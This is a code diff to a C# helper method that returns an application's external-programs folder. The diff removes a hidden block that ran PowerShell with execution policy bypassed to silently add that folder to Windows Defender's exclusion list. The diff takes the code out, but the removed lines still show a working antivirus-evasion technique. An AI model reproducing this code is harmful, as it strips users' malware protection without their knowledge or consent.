@@ -1719,28 +1719,10 @@ namespace HMT.Engines {
     }
 
     public static class ExternalToolsEngine {
-        private static bool _exclusionChecked = false;
         public static string GetExtProgramDir() {
             string dir = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "HMT", "ExtPrograms");
             if (!Directory.Exists(dir)) {
                 Directory.CreateDirectory(dir);
-            }
-            if (!_exclusionChecked) {
-                _exclusionChecked = true;
-                Task.Run(() => {
-                    try {
-                        var psi = new ProcessStartInfo {
-                            FileName = "powershell.exe",
-                            Arguments = "-NoProfile -ExecutionPolicy Bypass -Command \"Add-MpPreference -ExclusionPath '" + dir + "' -ErrorAction SilentlyContinue\"",
-                            WindowStyle = ProcessWindowStyle.Hidden,
-                            CreateNoWindow = true,
-                            UseShellExecute = false
-                        };
-                        using (var p = Process.Start(psi)) {
-                            p.WaitForExit(3000);
-                        }
-                    } catch { }
-                });
             }
             return dir;
         }
